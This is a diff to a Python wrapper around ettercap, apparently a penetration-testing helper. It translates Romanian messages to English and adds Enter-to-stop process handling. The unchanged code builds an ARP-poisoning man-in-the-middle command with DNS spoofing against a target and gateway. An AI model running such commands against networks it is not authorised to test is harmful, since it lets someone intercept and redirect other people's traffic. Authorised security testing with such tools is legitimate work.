@@ -2,8 +2,10 @@ import json
 import os
 import subprocess
 import netifaces
-
 from pathlib import Path
+import sys
+import select
+import time
  
 def get_gateway_ip():
     gws = netifaces.gateways()
@@ -49,11 +51,35 @@ def run_ettercap(option, target_ip=None,gateway_ip=None, iface="wlan0"):
     elif option == "3":
         cmd = ["ettercap", "-T", "-q" ,"-M", "arp:remote", f"//{target_ip}/",f"/{gateway_ip}//" , "-P" , "dns_spoof" , "-i", iface]
     else:
-        print("Opțiune invalidă.")
+        print("Invalid 0ption.")
         return
  
-    print(f"Rulez: {' '.join(cmd)}")
-    subprocess.run(cmd)
+    print(f"Running: {' '.join(cmd)}")
+    proc = subprocess.Popen(cmd)
+    print("Press Enter to stop ettercap...")
+
+    try:
+        while True:
+            if proc.poll() is not None:
+                print("Process exited.")
+                break
+
+            rlist, _, _ = select.select([sys.stdin], [], [], 0.5)
+            if rlist:
+                _ = sys.stdin.readline()
+                print("Stopping ettercap...")
+                proc.terminate()
+                try:
+                    proc.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                break
+    except KeyboardInterrupt:
+        proc.terminate()
+        try:
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
  
 def delete_scan_files(prefix: Path):
     prefix = prefix.with_suffix("") 
